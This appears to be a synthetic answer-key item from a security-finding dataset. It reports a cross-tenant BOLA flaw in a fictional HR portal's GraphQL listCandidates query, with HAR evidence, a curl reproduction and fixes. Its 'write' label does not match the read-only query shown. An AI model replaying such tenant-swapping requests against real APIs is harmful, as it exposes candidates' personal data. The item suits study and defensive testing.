# Expected Response

## System
- Domain: HR Tech / Talent Acquisition
- System: JobCore Candidate Portal
- Example ID: GQL-0159

## Priority Findings

### Finding 1: HR Tech — Write Access BOLA via listCandidates Exposes Cross-Tenant Candidate PII (Pattern 1.6)
**Severity:** High
**Category:** BOLA / Write Operations Without Ownership Check

**Summary:**
Per §5.0 (Pattern 1.6 — write operations without ownership check): The `listCandidates` resolver accepts a client-supplied `tenantId` filter, enabling cross-tenant candidate data access without write ownership verification. An attacker from `tenant-d4f2` passed `tenantId: "tenant-daf6"` and received candidate PII belonging to `tenant-daf6`, including `CONFIDENTIAL-d4f2daf6`. In HR Tech / Talent Acquisition, this exposes candidate resumes, interview feedback, and compensation expectations.

**Evidence from HAR:**
- Request: `POST https://api.jobcore-candidate-po.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-d4f2`
- Query: `listCandidates(tenantId: "tenant-daf6") { candidateId ownerId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-daf6"`, `ownerId: "other-user-d4f2daf6"`, `sensitiveField: "CONFIDENTIAL-d4f2daf6"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-d4f2daf6`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 1.6 | Write BOLA via list endpoint |
| HAR request | tenantId argument | tenant-daf6 (victim, client-supplied) |
| HAR response | tenantId | tenant-daf6 candidate data returned |
| HAR response | sensitiveField | CONFIDENTIAL-d4f2daf6 |

## Steps to Reproduce

### Step 1 — listCandidates cross-tenant (HAR)
```bash
curl -s -X POST https://api.jobcore-candidate-po.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-d4f2" \
  -d '{"query": "query { listCandidates(tenantId: \"tenant-daf6\") { candidateId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** `tenant-daf6` candidate PII returned. **Secure:** Only `tenant-d4f2` data or FORBIDDEN.

## Remediation
1. Remove `tenantId` arg from `listCandidates`; derive from `$jwt.tenantId`.
2. Resolver: `WHERE tenant_id = $jwt.tenantId`.
3. Redis cache key: `candidate:{tenantId}:{candidateId}`.
